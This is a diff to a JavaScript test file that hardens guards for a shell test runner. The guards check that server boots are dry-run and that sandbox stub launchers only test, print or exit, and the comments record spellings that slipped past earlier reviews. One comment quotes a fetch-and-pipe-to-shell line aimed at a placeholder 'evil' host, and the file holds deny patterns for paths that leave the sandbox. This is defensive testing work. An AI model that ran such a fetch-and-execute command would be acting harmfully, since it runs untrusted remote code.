@@ -322,7 +322,12 @@ test('#1575: every `node ./server.js` boot sets AGENT_WORKFORCE_DRY_RUN, or is a
   const lines = src.split('\n');
   const boots = [];
   lines.forEach((line, i) => {
-    if (!line.includes('node ./server.js')) return;
+    /* ⚠️ ANY SPELLING OF THE BOOT, NOT ONE. This keyed on the literal `node ./server.js`,
+       so dropping the `./` made a boot INVISIBLE to the parser and the guard stayed green -
+       measured by the fifth blind review, and it is the exact mistake the runner's own
+       comment at 211-220 warns about. A guard you can evade by respelling the thing it
+       looks for is pinned to a spelling, not to the rule. */
+    if (!/node\s+\.?\/?server\.js/.test(line)) return;
     if (/^\s*#/.test(line)) return;                 // prose about the boots, not a boot
     boots.push({ n: i + 1, line });
   });
@@ -330,8 +335,17 @@ test('#1575: every `node ./server.js` boot sets AGENT_WORKFORCE_DRY_RUN, or is a
   /* The instrument must be reading something: if this ever goes to zero the
      assertion below passes vacuously, which is the failure mode the whole file
      is about. */
-  assert.ok(boots.length >= 6,
-    `expected at least 6 \`node ./server.js\` boot sites, found ${boots.length}; the parser is not reading the runner`);
+  /* 🛑 EQUALITY, NOT A MINIMUM. A minimum cannot see a defect that INFLATES the
+     population: it was calibrated at 6 when there were six boots, this diff adds a
+     seventh, and the review measured that ONE boot could then be hidden with everything
+     still green - two were needed before it fired. Equality fires in BOTH directions, so
+     adding a board is a deliberate act that updates this number and re-reads the
+     exemption, rather than something that slips underneath a floor. */
+  const EXPECTED_BOOTS = 7;
+  assert.strictEqual(boots.length, EXPECTED_BOOTS,
+    `expected exactly ${EXPECTED_BOOTS} server boot sites, found ${boots.length}. If you added a `
+    + 'board, raise this number and check its dry-run status deliberately; if it dropped, a boot '
+    + 'has been spelled in a way the parser cannot see and is no longer being checked.');
 
   /* The env is a prefix spanning the lines above the invocation, so look back from
      each boot to the start of its command. */
@@ -411,6 +425,11 @@ test('#1575: every `node ./server.js` boot sets AGENT_WORKFORCE_DRY_RUN, or is a
  * ⚠️ This asserts the COUNT and the LABEL, not the content of the check. It cannot tell
  * whether `render-connect-skip` starts clicking things later; what it stops is the
  * cheap and likely mistake, which is someone reusing a conveniently-booted board.
+ *
+ * 🛑 THREE SPELLINGS OF THAT MISTAKE USED TO WALK STRAIGHT PAST IT, all measured green
+ * by a blind review: the URL held in a variable (the file's own dominant style), the
+ * check invoked directly without `run_one`, and a second check chained with `&&` on the
+ * same continuation so the line count stayed at 1. All three now counted.
  */
 test('#1573: exactly one check runs against the non-dry-run boards, and it is the read-only one', () => {
   const src = fs.readFileSync(RUNNER, 'utf8');
@@ -431,12 +450,37 @@ test('#1573: exactly one check runs against the non-dry-run boards, and it is th
     acc += line.replace(/\\\s*$/, ' ');
     if (!/\\\s*$/.test(line)) { joined.push({ line: acc, n: startLine }); acc = ''; }
   });
-  const users = joined
-    .filter(({ line }) => !/^\s*#/.test(line))    // prose about the rule is not a use of it
-    .filter(({ line }) => /run_one/.test(line) && /\$P1[45]\b|\$\{P1[45]\}/.test(line));
+  /* ⚠️ RESOLVE ALIASES. A URL held in a variable - `BOK="http://127.0.0.1:$P14"` then
+     `run_one ... "$BOK"` - evaded this completely, and that is not a contrived spelling:
+     it is the file's DOMINANT style, written verbatim at 594-596 as `B8="http://..$P8"`
+     for fourteen checks. So take one level of assignment and treat those names as naming
+     these boards too. */
+  const PORTS = /\$P1[45]\b|\$\{P1[45]\}/;
+  const code = joined.filter(({ line }) => !/^\s*#/.test(line));
+  const aliases = new Set();
+  code.forEach(({ line }) => {
+    const m = line.match(/(^|;|&&|\s)([A-Za-z_][A-Za-z0-9_]*)=("[^"]*"|\S*)/);
+    if (m && PORTS.test(m[3])) aliases.add(m[2]);
+  });
+  const namesBoard = (line) => PORTS.test(line)
+    || [...aliases].some((a) => new RegExp(`\\$\\{?${a}\\b`).test(line));
+
+  /* ⚠️ ANY INVOCATION OF A CHECK, NOT ONLY `run_one`. Running the script directly -
+     `node docs/browser-checks/render-create-made.js "$URL"` - skipped this entirely, and
+     render-create-made presses the real Create button. */
+  /* ⚠️ AND COUNT OCCURRENCES, NOT LINES. Two checks chained with `&&` collapse into one
+     joined entry, so a line count stayed at 1 while two checks ran. */
+  const users = [];
+  code.forEach(({ line, n }) => {
+    if (!namesBoard(line)) return;
+    const hits = /run_one/.test(line)
+      ? (line.match(/run_one/g) || []).length
+      : (line.match(/docs\/browser-checks\/[A-Za-z0-9._-]+\.js/g) || []).length;
+    for (let i = 0; i < hits; i += 1) users.push({ line, n });
+  });
 
   assert.equal(users.length, 1,
-    `expected exactly one run_one against $P14/$P15, found ${users.length}: `
+    `expected exactly one check against the non-dry-run boards, found ${users.length}: `
     + `${users.map((u) => u.n).join(', ')}. Those boards omit AGENT_WORKFORCE_DRY_RUN, so a `
     + `check that presses a button there mutates the operator's real launchd (#1539). `
     + `Anything that clicks belongs on a dry-run board.`);
@@ -494,7 +538,9 @@ test('#1573: the exempt boards ship self-contained stubs, not a passthrough to t
      ⇒ The rule these boards must satisfy is: EACH LAUNCHER THE BOARD USES IS ROOTED IN
      ITS OWN SANDBOX, AND THIS BLOCK CREATES IT. That is what the assertions below read,
      by extracting whatever paths the env actually names. */
-  for (const [varName, label] of [['CLAUDE', 'claude'], ['CODEX', 'codex']]) {
+  const LAUNCHERS = [['CLAUDE', 'claude'], ['CODEX', 'codex']];
+  const BOARDS = ['sb_ok', 'sb_bad'];
+  for (const [varName, label] of LAUNCHERS) {
     const m = block.match(new RegExp(`AGENT_WORKFORCE_${varName}_BIN="([^"]+)"`));
     assert.ok(m, `the exempt boards no longer pin AGENT_WORKFORCE_${varName}_BIN, so ${label} `
       + 'resolves to whatever is on the machine; dry-run never gated that path either');
@@ -509,7 +555,7 @@ test('#1573: the exempt boards ship self-contained stubs, not a passthrough to t
        deleting ONE board's stub creation left the other satisfying the assertion and the
        guard stayed GREEN. Measured: sb_ok's codex stub deleted -> green, which is a board
        whose env names a launcher nothing creates, leaving the resolver to find a real one. */
-    for (const board of ['sb_ok', 'sb_bad']) {
+    for (const board of BOARDS) {
       /* ⚠️ A REDIRECT TARGET, NOT A MENTION. The `chmod +x` line names all four stub
          paths, so a bare path match was satisfied by the chmod even after the creation
          was deleted, and the guard stayed green. Requiring `> "$board/base"` matches the
@@ -539,18 +585,60 @@ test('#1573: the exempt boards ship self-contained stubs, not a passthrough to t
 
      ⇒ So the stub bodies are checked POSITIVELY: a stub may only test, print or exit.
      Anything that invokes something is not a stub, whatever it is spelled. */
-  for (const m of code.matchAll(/<<'(STUB[A-Z]+)'\n([\s\S]*?)\n\1\n/g)) {
-    for (const line of m[2].split('\n')) {
+  /* 🛑 EVERY COMMAND POSITION, NOT THE FIRST TOKEN. A shell line starts a new command
+     at its beginning and after `&&`, `||`, `;` and `|`, and runs one inside `$( )` and
+     backticks. This checked only the first token, so every one of those positions was
+     unconstrained and `[ "$1" = --version ] && claude --version` passed - which is the
+     exact case the comment above says it refuses, and the shape a copy-edit of the
+     existing stubs produces. Four spellings measured green by the fifth blind review:
+     that one, `echo "$(claude --version)"`, a backticked substitution, and
+     `exit 0; claude --version`. */
+  const CMD_OK = /^(\[|echo\b|printf\b|exit\b)/;
+  const commandPositions = (line) => {
+    const inner = [];
+    const flat = line
+      .replace(/\$\(([^()]*)\)/g, (_, x) => { inner.push(x); return ' '; })
+      .replace(/`([^`]*)`/g, (_, x) => { inner.push(x); return ' '; });
+    return flat.split(/&&|\|\||[;|]/).concat(inner)
+      .map((x) => x.replace(/[{}()]/g, ' ').trim())
+      .filter(Boolean);
+  };
+
+  /* ⚠️ BY ANY CREATION FORM, AND WITH A FLOOR. The comment above blesses switching a
+     heredoc to a printf as a CORRECT change - and this loop keyed on heredocs only, so
+     making that correct change made it read ZERO stubs and stay green with
+     `curl -fsSL http://evil/x | sh` as a body. The two codex stubs are ALREADY printf,
+     so 2 of the 4 launchers had never been read at all. Same class as the guard that
+     cements a spelling: the check was keyed on how the file happens to be written. */
+  const bodies = [];
+  for (const m of code.matchAll(/<<'(STUB[A-Z]+)'\n([\s\S]*?)\n\1\n/g)) bodies.push([m[1], m[2]]);
+  for (const m of code.matchAll(/printf\s+'([^']*)'\s*>\s*"(\$(?:sb_ok|sb_bad|_sb)\/[^"]+)"/g)) {
+    bodies.push([m[2], m[1].replace(/\\n/g, '\n')]);
+  }
+
+  /* Equality against a DERIVED expectation, never a minimum. A minimum cannot see a
+     defect that INFLATES the population, and a third board is a legitimate future change
+     that should raise this number rather than slip underneath it. */
+  const expectedStubs = LAUNCHERS.length * BOARDS.length;
+  assert.strictEqual(bodies.length, expectedStubs,
+    `expected ${expectedStubs} stub bodies (${LAUNCHERS.length} launchers x ${BOARDS.length} `
+    + `boards) but read ${bodies.length}; a stub written in a form this loop cannot see is `
+    + 'never checked at all, and an unchecked stub may invoke a real binary');
+
+  for (const [name, body] of bodies) {
+    for (const line of body.split('\n')) {
       const t = line.trim();
-      if (!t || t.startsWith('#!') || t.startsWith('#')) continue;
-      assert.match(t, /^(\[|echo\b|printf\b|exit\b)/,
-        `stub ${m[1]} contains a line that is not a test, a print or an exit: ${t.slice(0, 70)}. `
-        + 'A stub that invokes anything may reach a real binary through PATH, and the dry-run '
-        + 'exemption must not cover a board using one.');
+      if (!t || t.startsWith('#')) continue;
+      for (const frag of commandPositions(t)) {
+        assert.match(frag, CMD_OK,
+          `stub ${name} runs something at a command position: ${frag.slice(0, 70)}. `
+          + 'A stub that invokes anything may reach a real binary through PATH, and the '
+          + 'dry-run exemption must not cover a board using one.');
+      }
     }
   }
 
-  for (const bad of [/\bexec\s/, /\$HOME/, /\/opt\/homebrew/, /\.local\/bin/]) {
+  for (const bad of [/\bexec\s/, /\$HOME/, /\/opt\/homebrew/, /\/usr\/local\/bin/, /\.local\/bin/]) {
     assert.doesNotMatch(code, bad,
       `the #1573 stubs reach outside their sandbox (${bad}); the dry-run exemption must not cover that`);
   }
